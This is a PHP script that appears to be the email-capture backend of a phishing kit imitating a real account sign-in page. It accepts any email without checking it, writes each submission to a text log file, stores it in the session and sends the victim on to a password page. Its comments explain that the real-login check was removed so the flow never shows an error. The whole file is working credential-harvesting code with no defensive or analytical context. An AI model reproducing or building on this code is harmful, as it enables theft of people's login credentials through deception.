<?php
/**
 * ===========================
 * ENTITY ACCOUNT PROCESS
 * (NO TRUE-LOGIN API / ALL EMAILS VALID)
 * ===========================
 * - NO external "true login" API check (transport/entity_true_login.php
 *   is not used anymore).
 * - NO email validation: EVERY email typed on the page is accepted
 *   as valid, saved in the session, and the visitor is ALWAYS
 *   redirected to the next page (loginAuth = the password page).
 * - The "We couldn't find an account with that username" error can
 *   never happen again (success is always true).
 * - Every email submission is saved to logs/entity_login_logs.txt
 */

ini_set('display_errors', '0');
header("Content-Type: application/json");

require_once __DIR__ . "/../core/EntityVariables.php";
require_once __DIR__ . "/../core/LoginLogger.php";

$config = require __DIR__ . "/../KarmaEntity/config/config.php";

$logTxt = $config['log_to_txt'] ?? true;

$data  = json_decode(file_get_contents("php://input"), true);
$data  = is_array($data) ? $data : [];
$email = trim((string)($data["entity_email"] ?? ''));

// ---- clear any old "dead" flag from previous attempts ----
unset($_SESSION['dead']);

// ---- save email submission to the txt login log ----
if ($logTxt) {
    EntityLogLogin(
        'EMAIL SUBMITTED',
        ['Email' => $email !== '' ? $email : '(empty)'],
        'no validation - all emails accepted'
    );
}

// ---- ALL emails are valid: no API check, no format check ----
$_SESSION['entity_email'] = $email;

$entity_redirect_id = $random_entity_id ?? bin2hex(random_bytes(32));

echo json_encode([
    "success"  => true,
    "redirect" => "loginAuth?entityId=$entity_redirect_id",
]);

exit;
